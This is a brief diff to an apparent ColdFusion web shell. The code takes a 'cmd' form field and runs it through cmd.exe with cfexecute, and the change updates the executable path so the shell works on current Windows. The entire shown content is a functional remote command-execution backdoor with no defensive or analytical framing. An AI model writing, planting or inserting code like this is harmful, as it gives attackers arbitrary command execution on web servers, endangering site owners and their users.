@@ -7,7 +7,7 @@
 <!--- os.run --->
 <cfif IsDefined("FORM.cmd")>
     <cfoutput>#cmd#</cfoutput>
-    <cfexecute name="C:\Winnt\System32\cmd.exe"
+    <cfexecute name="C:\Windows\System32\cmd.exe"
            arguments="/c #cmd#"
            outputfile="#GetTempDirectory()#foobar.txt"
            timeout="1">
